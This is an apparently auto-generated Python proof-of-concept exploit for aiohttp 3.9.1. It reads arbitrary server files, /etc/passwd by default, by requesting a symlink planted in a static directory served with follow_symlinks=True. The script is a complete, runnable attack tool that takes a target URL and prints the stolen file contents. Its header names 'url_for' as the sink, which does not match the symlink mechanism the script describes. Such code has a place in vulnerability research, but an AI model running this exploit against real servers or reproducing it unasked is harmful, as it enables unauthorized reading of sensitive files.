#!/usr/bin/env python3
# PoC for aiohttp-3.9.1 (/tmp/aiohttp-3.9.1)
# Path: lfi-013
# Sink: url_for
# Auto-generated — run with: python3 lfi_code_allows_reading_through_url_for.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for aiohttp-3.9.1 Local File Inclusion (LFI)
Vulnerability: When the static file handler is configured with follow_symlinks=True,
an attacker who can create a symlink inside the static directory can read arbitrary files
from the server filesystem (e.g., /etc/passwd).

Prerequisites:
- The target aiohttp application must have deployed a static file handler (e.g., static('/static', '/path/to/static', follow_symlinks=True)).
- The attacker must have the ability to create a symlink inside the static directory
  (e.g., via a separate file upload feature, or any write access to that directory).
  The symlink should point to a sensitive file (e.g., /etc/passwd).

Usage:
    python poc_aiohttp_lfi.py --url http://target.com --prefix /static --symlink evil_symlink --target /etc/passwd

The script will attempt to fetch the symlink URL and print the file contents if successful.
"""

import argparse
import sys

try:
    import requests
except ImportError:
    print("[-] 'requests' library required. Install with: pip install requests")
    sys.exit(1)


def exploit(url, prefix, symlink_name, target_file, verbose=False):
    """
    Attempt to read target_file by accessing the symlink URL.
    Assumes the symlink exists and points to the target file.
    """
    symlink_url = url.rstrip('/') + prefix.rstrip('/') + '/' + symlink_name.lstrip('/')
    if verbose:
        print(f"[*] Constructed URL: {symlink_url}")
        print(f"[*] Trying to read: {target_file} (via symlink '{symlink_name}')")

    try:
        resp = requests.get(symlink_url, timeout=10)
    except requests.exceptions.ConnectionError:
        print("[-] Could not connect to the target. Check URL and network.")
        return
    except requests.exceptions.Timeout:
        print("[-] Request timed out.")
        return
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return

    if resp.status_code == 200:
        print("[+] Success! File content received:")
        print(resp.text)
    elif resp.status_code == 404:
        print("[-] Symlink not found (404). Ensure the symlink exists and the prefix is correct.")
        print("    Also verify that the static handler is set to follow_symlinks=True.")
    elif resp.status_code == 403:
        print("[-] Access denied (403). The server might be blocking or the symlink is not readable.")
    else:
        print(f"[-] Unexpected status code: {resp.status_code}")
        print("    Response body preview:", resp.text[:200])


def main():
    parser = argparse.ArgumentParser(
        description="PoC for aiohttp-3.9.1 LFI via symlink when follow_symlinks=True"
    )
    parser.add_argument(
        "--url", required=True,
        help="Base URL of the target (e.g., http://victim.com)"
    )
    parser.add_argument(
        "--prefix", default="/static",
        help="URL prefix for the static file handler (default: /static)"
    )
    parser.add_argument(
        "--symlink", default="evil_symlink",
        help="Name of the symlink file placed inside the static directory"
    )
    parser.add_argument(
        "--target", default="/etc/passwd",
        help="Path to the file that the symlink points to (default: /etc/passwd)"
    )
    parser.add_argument(
        "--verbose", "-v", action="store_true",
        help="Print detailed information"
    )

    args = parser.parse_args()

    # Sanity check: ensure target is an absolute path
    if not args.target.startswith("/"):
        print("[!] Warning: Target file should be an absolute path (e.g., /etc/passwd).")
        print("    Continuing anyway...")

    # Print startup info
    print("[*] aiohttp-3.9.1 Symlink LFI PoC")
    print(f"[*] Target: {args.url}")
    print(f"[*] Static prefix: {args.prefix}")
    print(f"[*] Symlink name: {args.symlink}")
    print(f"[*] Target file: {args.target}")
    print()
    print("[!] IMPORTANT: Ensure a symlink with this name exists inside the static directory.")
    print("    The script will attempt to read the file via that symlink.")
    print()

    exploit(args.url, args.prefix, args.symlink, args.target, verbose=args.verbose)


if __name__ == "__main__":
    main()
